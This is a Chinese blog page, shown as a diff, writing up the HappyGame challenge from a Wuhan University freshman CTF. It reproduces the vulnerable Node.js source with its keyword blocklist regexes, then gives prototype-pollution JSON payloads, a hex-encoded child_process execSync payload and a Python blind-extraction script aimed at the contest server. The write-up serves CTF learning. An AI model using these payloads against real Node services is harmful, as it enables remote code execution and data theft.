@@ -1,0 +1,687 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>WHUCTF - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="WHUCTF">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-05-28 20:09" pubdate>
+        2020年5月28日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      21
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">WHUCTF</h1>
+            
+            <div class="markdown-body">
+              <blockquote>
+<p>记录一下武汉大学的新生赛的两题</p>
+</blockquote>
+<h1 id="HappyGame"><a href="#HappyGame" class="headerlink" title="HappyGame"></a>HappyGame</h1><p>查看源码有<code>var backup = &quot;/BackUp.zip&quot;</code>,下载下来发现是源码</p>
+<pre><code class="hljs javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);
+<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);
+<span class="hljs-keyword">const</span> opn = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;opn&#x27;</span>);
+<span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);
+<span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express-session&quot;</span>);
+<span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);
+<span class="hljs-keyword">const</span> stringRandom = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;string-random&#x27;</span>);
+<span class="hljs-keyword">const</span> app = express();
+<span class="hljs-keyword">const</span> FUNCFLAG = <span class="hljs-string">&#x27;_$$ND_FUNC$$_&#x27;</span>;
+<span class="hljs-keyword">const</span> serialize_banner = <span class="hljs-string">&#x27;&#123;&quot;banner&quot;:&quot;Congratulations! 你是目前最高分！&quot;&#125;&#x27;</span>;
+app.use(bodyParser());
+app.use(bodyParser.json());
+
+<span class="hljs-keyword">const</span> logs=&#123;&#125;;
+<span class="hljs-keyword">var</span> highestScore = <span class="hljs-number">400</span>;
+
+
+<span class="hljs-keyword">const</span> serialize = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">obj</span>) </span>&#123;
+  <span class="hljs-keyword">var</span> outputObj = &#123;&#125;;
+  <span class="hljs-keyword">var</span> key;
+  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> obj === <span class="hljs-string">&#x27;string&#x27;</span>) &#123;
+    <span class="hljs-keyword">return</span> <span class="hljs-built_in">JSON</span>.stringify(obj);
+  &#125;
+  <span class="hljs-keyword">for</span>(key <span class="hljs-keyword">in</span> obj) &#123;
+    <span class="hljs-keyword">if</span>(obj.hasOwnProperty(key)) &#123;
+      <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> obj[key] === <span class="hljs-string">&#x27;function&#x27;</span>) &#123;
+        <span class="hljs-keyword">var</span> funcStr = obj[key].toString();
+        outputObj[key] = FUNCFLAG + funcStr;
+      &#125; <span class="hljs-keyword">else</span> &#123;
+        outputObj[key] = obj[key];
+      &#125;
+    &#125;
+  &#125;
+  <span class="hljs-keyword">return</span> <span class="hljs-built_in">JSON</span>.stringify(outputObj);
+&#125;;
+
+<span class="hljs-keyword">const</span> validCode = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">func_code</span>)</span>&#123;
+  <span class="hljs-keyword">let</span> validInput = <span class="hljs-regexp">/process|child_process|main|require|exec|this|eval|while|for|function|hex|char|base64|&quot;|&#x27;|\[|\+|\*/ig</span>;
+  <span class="hljs-keyword">return</span> !validInput.test(func_code);
+&#125;;
+
+<span class="hljs-keyword">const</span> validInput = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">input</span>)</span>&#123;
+  <span class="hljs-comment">// filter bad input</span>
+  <span class="hljs-keyword">let</span> validInput = <span class="hljs-regexp">/process|child_process|main|require|exec|this|function/ig</span>;
+  ins = serialize(input);
+  <span class="hljs-keyword">return</span> !validInput.test(ins);
+&#125;;
+
+
+<span class="hljs-comment">// not safe</span>
+<span class="hljs-keyword">const</span> unserialize = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">obj</span>) </span>&#123;
+  obj = <span class="hljs-built_in">JSON</span>.parse(obj);
+  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> obj === <span class="hljs-string">&#x27;string&#x27;</span>) &#123;
+    <span class="hljs-keyword">return</span> obj;
+  &#125;
+  <span class="hljs-keyword">var</span> key;
+  <span class="hljs-keyword">for</span>(key <span class="hljs-keyword">in</span> obj) &#123;
+    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> obj[key] === <span class="hljs-string">&#x27;string&#x27;</span>) &#123;
+      <span class="hljs-keyword">if</span>(obj[key].indexOf(FUNCFLAG) === <span class="hljs-number">0</span>) &#123;
+        <span class="hljs-keyword">var</span> func_code=obj[key].substring(FUNCFLAG.length);
+        <span class="hljs-keyword">if</span> (validCode(func_code))&#123;
+          <span class="hljs-keyword">var</span> d = <span class="hljs-string">&#x27;(&#x27;</span> + func_code + <span class="hljs-string">&#x27;)&#x27;</span>;
+          obj[key] = <span class="hljs-built_in">eval</span>(d);
+        &#125;
+      &#125;
+    &#125;
+  &#125;
+  <span class="hljs-keyword">return</span> obj;
+&#125;;
+
+<span class="hljs-keyword">const</span> merge = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">target, source</span>) </span>&#123;
+  <span class="hljs-keyword">try</span>&#123;
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;
+      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> source[key] == <span class="hljs-string">&#x27;object&#x27;</span> ) &#123;
+        merge(target[key], source[key]);
+      &#125; <span class="hljs-keyword">else</span> &#123;
+        target[key] = source[key];
+      &#125;
+    &#125;
+  &#125;
+  <span class="hljs-keyword">catch</span> (e) &#123;
+    <span class="hljs-built_in">console</span>.log(e);
+  &#125;
+&#125;;
+
+
+<span class="hljs-keyword">const</span> genSanbox = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req</span>)</span>&#123;
+  <span class="hljs-keyword">var</span> content = stringRandom(<span class="hljs-number">32</span>);
+  <span class="hljs-keyword">var</span> result = crypto.createHash(<span class="hljs-string">&#x27;md5&#x27;</span>).update(content).digest(<span class="hljs-string">&quot;hex&quot;</span>);
+  req.session.sanbox = result;
+  logs[result] = <span class="hljs-keyword">new</span> Record();
+  <span class="hljs-keyword">return</span> result;
+&#125;;
+
+<span class="hljs-keyword">const</span> getSanbox = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req</span>)</span>&#123;
+  <span class="hljs-keyword">return</span> req.session.sanbox;
+&#125;;
+
+app.use(session(&#123;
+  secret: <span class="hljs-string">&#x27;hahahahahaha@@@@@@&#x27;</span>,
+  name : <span class="hljs-string">&#x27;sessionId&#x27;</span>,
+  resave: <span class="hljs-literal">false</span>,
+  saveUninitialized: <span class="hljs-literal">false</span>
+&#125;));
+
+app.use(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>)</span>&#123;
+  <span class="hljs-keyword">if</span>(!getSanbox(req))&#123;
+    genSanbox(req);
+  &#125;
+  <span class="hljs-keyword">if</span>(validInput(req.body)) &#123;
+    next();
+  &#125; <span class="hljs-keyword">else</span>&#123;
+    res.status(<span class="hljs-number">403</span>).send(<span class="hljs-string">&#x27;Hacker!!!&#x27;</span>);
+  &#125;
+&#125;);
+
+<span class="hljs-keyword">const</span> clearEnvir = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)</span>&#123;
+  <span class="hljs-keyword">for</span>(key <span class="hljs-keyword">in</span> <span class="hljs-built_in">Object</span>())&#123;<span class="hljs-keyword">delete</span> &#123;&#125;.__proto__[key]&#125;;
+&#125;;
+
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Record</span>(<span class="hljs-params"></span>)</span>&#123;
+  <span class="hljs-built_in">this</span>.lastScore=<span class="hljs-number">0</span>;
+  <span class="hljs-built_in">this</span>.maxScore=<span class="hljs-number">0</span>;
+  <span class="hljs-built_in">this</span>.lastTime=<span class="hljs-literal">null</span>;
+&#125;
+
+<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">record</span> (<span class="hljs-params">req, res, next</span>)</span>&#123;
+  <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">resolve, reject</span>) </span>&#123;
+    <span class="hljs-keyword">var</span> sanbox = getSanbox(req);
+    <span class="hljs-keyword">var</span> record = <span class="hljs-keyword">new</span> Record();
+    <span class="hljs-keyword">var</span> score = req.body.score;
+    <span class="hljs-keyword">var</span> oldRecord = logs[sanbox];
+
+    <span class="hljs-built_in">console</span>.log(score);
+    clearEnvir();
+    <span class="hljs-keyword">if</span> (score.length&lt;<span class="hljs-number">5</span>)&#123;
+      merge(record, &#123;
+        lastScore: score,
+        maxScore: <span class="hljs-built_in">parseInt</span>(logs[sanbox].maxScore)&gt;<span class="hljs-built_in">parseInt</span>(score)?logs[sanbox].maxScore:score,
+        lastTime: <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>().toString()
+      &#125;);
+      logs[sanbox] = record;
+      oldRecord.maxScore = record.maxScore;
+      highestScore = highestScore &gt; <span class="hljs-built_in">parseInt</span>(score)? highestScore: <span class="hljs-built_in">parseInt</span>(score);
+      <span class="hljs-keyword">if</span>((score - highestScore)&lt;<span class="hljs-number">0</span>)&#123;
+        <span class="hljs-keyword">var</span> banner = <span class="hljs-string">&quot;再接再厉，马上就要赶上最高分了！&quot;</span>;
+      &#125;<span class="hljs-keyword">else</span>&#123;
+        <span class="hljs-comment">// var serialize_banner = req.params.data;</span>
+        <span class="hljs-keyword">var</span> banner = unserialize(serialize_banner).banner;
+      &#125;
+    &#125;<span class="hljs-keyword">else</span>&#123;
+      banner=<span class="hljs-string">&quot;我都打不了这么高， 你小子肯定作弊了&quot;</span>;
+    &#125;
+
+    clearEnvir();
+    res.json(&#123;
+      banner: banner,
+      record: oldRecord
+    &#125;);
+  &#125;).catch(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err</span>)</span>&#123;
+    next(err)
+  &#125;)
+&#125;
+
+app.post(<span class="hljs-string">&#x27;/record&#x27;</span>, record);
+app.get(<span class="hljs-string">&#x27;/token&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;
+  token = getSanbox(req);
+  res.end(token);
+&#125;);
+
+app.use(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;
+  res.status(<span class="hljs-number">404</span>).send(<span class="hljs-string">&#x27;Not Found&#x27;</span>)
+&#125;);
+
+app.use(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err, req, res, next</span>) </span>&#123;
+  <span class="hljs-built_in">console</span>.log(err.stack);
+  clearEnvir();
+  res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&#x27;Some thing broke!&#x27;</span>)
+&#125;);
+
+<span class="hljs-keyword">const</span> server = app.listen(<span class="hljs-number">8082</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;
+  <span class="hljs-keyword">var</span> host = server.address().address;
+  <span class="hljs-keyword">var</span> port = server.address().port;
+  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Example app listening at http://%s:%s&quot;</span>, host, port)
+&#125;);</code></pre>
+
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7184">https://xz.aliyun.com/t/7184</a></p>
+<p>两个点 一个是<code>merge</code>处有原型污染，二是serialize反序列化RCE漏洞在上面那个链接里都有说</p>
+<p>污染到serialize_banner再绕过滤就可以RCE,如这样</p>
+<pre><code class="hljs javascript">&#123;<span class="hljs-string">&quot;score&quot;</span>: &#123;<span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-string">&quot;_$$ND_FUNC$$_a=XXXX&quot;</span>&#125;&#125;&#125;&#125;</code></pre>
+
+<p>题目限制了score.length&lt;5，这里有个小tricks</p>
+<pre><code class="hljs javascript">&#123;<span class="hljs-string">&quot;score&quot;</span>: &#123;<span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-string">&quot;_$$ND_FUNC$$_a=XXXX&quot;</span>&#125;&#125;,<span class="hljs-string">&quot;length&quot;</span>: <span class="hljs-number">1</span>&#125;&#125;</code></pre>
+
+<p>然后如何绕过关键字过滤，可以编码绕</p>
+<pre><code class="hljs kotlin">&#123;<span class="hljs-string">&quot;score&quot;</span>: &#123;<span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;banner1&quot;</span>: <span class="hljs-string">&quot;_$<span class="hljs-variable">$ND_FUNC</span>$<span class="hljs-variable">$_logs</span>.543e5ea084679bf7d1b7e5becf8fd99a.lastTime=Buffer.constructor(Buffer.from(`72657475726e2070726f636573732e6d61696e4d6f64756c652e636f6e7374727563746f722e5f6c6f616428276368696c645f70726f6365737327292e6578656353796e632827636174202f666c616727292e746f537472696e672829`, `he\\x78`).toString())()&quot;</span>&#125;&#125;, <span class="hljs-string">&quot;length&quot;</span>: <span class="hljs-number">1</span>&#125;&#125;
+
+
+<span class="hljs-keyword">return</span> process.mainModule.<span class="hljs-keyword">constructor</span>._load(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync(<span class="hljs-string">&#x27;cat /flag&#x27;</span>).toString()
+
+log后面的一串是类似token的标识</code></pre>
+
+
+
+<p>当初Y老师做出来是靠命令注入</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> time
+<span class="hljs-keyword">import</span> string
+<span class="hljs-keyword">import</span> json
+
+url = <span class="hljs-string">&quot;http://218.197.154.9:10001/record&quot;</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen</span>(<span class="hljs-params">c</span>):</span>
+    p = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;\\x&#x27;</span>+<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))[<span class="hljs-number">2</span>:] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;return process.mainModule.require(\&#x27;child_process\&#x27;).execSync(\&#x27;&#x27;</span>+c+<span class="hljs-string">&#x27;\&#x27;).toString()&#x27;</span>])
+    r = &#123;<span class="hljs-string">&quot;score&quot;</span>:&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-string">&quot;_$$ND_FUNC$$_``.constructor.constructor(`&quot;</span> + p + <span class="hljs-string">&quot;`)()&quot;</span>&#125;&#125;,<span class="hljs-string">&quot;length&quot;</span>:<span class="hljs-number">4</span>&#125;&#125;
+    <span class="hljs-keyword">return</span> r
+
+r = requests.post(url, json=gen(<span class="hljs-string">&#x27;ls&#x27;</span>))
+print(<span class="hljs-keyword">not</span> <span class="hljs-string">&#x27;broke&#x27;</span> <span class="hljs-keyword">in</span> r.text)
+
+di = <span class="hljs-string">&quot;&#123;&#125;_abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>
+
+payload = <span class="hljs-string">&quot;&quot;</span>
+<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):
+  print(<span class="hljs-string">&quot;第&quot;</span>+<span class="hljs-built_in">str</span>(j)+<span class="hljs-string">&quot;轮&quot;</span>)
+  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> di:
+    r = requests.post(url, json=gen(<span class="hljs-string">&#x27;grep -e &quot;&#123;&#125;&quot; /flag&#x27;</span>.<span class="hljs-built_in">format</span>(payload+i)))
+    r = <span class="hljs-keyword">not</span> <span class="hljs-string">&#x27;broke&#x27;</span> <span class="hljs-keyword">in</span> r.text
+    <span class="hljs-keyword">if</span> r:
+        payload = payload+i
+        print(payload)
+        <span class="hljs-keyword">break</span></code></pre>
+
+<p>函数里包了一个函数，然后就获取不到全局变量了</p>
+<h1 id="BookShop"><a href="#BookShop" class="headerlink" title="BookShop"></a>BookShop</h1><p>不想写了，留一个出题人博客</p>
+<p><a target="_blank" rel="noopener" href="https://blog.szfszf.top/article/43/">https://blog.szfszf.top/article/43/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/nodejs/">nodejs</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/05/29/%E5%86%85%E7%BD%91/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">内网</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/05/25/GKCTF2020/">
+                        <span class="hidden-mobile">GKCTF2020</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
